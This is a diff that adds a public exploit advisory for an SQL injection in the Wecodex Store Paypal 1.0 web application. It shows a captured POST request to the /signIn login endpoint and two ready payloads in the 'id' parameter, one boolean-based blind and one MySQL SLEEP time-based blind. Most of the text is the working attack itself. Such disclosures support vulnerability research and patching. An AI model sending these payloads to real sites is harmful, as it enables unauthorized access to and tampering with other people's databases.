@@ -1,0 +1,48 @@
+# Exploit Title: Wecodex Store Paypal 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-05-23
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://www.wecodex.com/item/view/online-store-system-with-paypal-sdk-in-php/9
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : PHP Dashboards is prone to an SQL-injection vulnerability
+# because it fails to sufficiently sanitize user-supplied data before using
+# it in an SQL query.Exploiting this issue could allow an attacker to
+# compromise the application, access or modify data, or exploit latent
+# vulnerabilities in the underlying database.
+
+# PoC : SQLi :
+# Demo : https://Target
+
+https://Target/signIn
+
+POST /signIn HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://Target/login
+Content-Length: 23
+Cookie: PHPSESSID=j89q1i6r4i1juosmihns9c1jo2
+Connection: keep-alive
+id=admin&password=12345
+
+
+# Vulnerable Payload :
+# Parameter: id (POST)
+# Type: boolean-based blind
+# Title: AND boolean-based blind - WHERE or HAVING clause
+# Payload: 
+
+id=admin' AND 9071=9071 AND 'gneN'='gneN&password=12345
+
+# Type: AND/OR time-based blind
+# Title: MySQL >= 5.0.12 OR time-based blind
+# Payload: 
+
+id=admin' OR SLEEP(5) AND 'gXNU'='gXNU&password=12345
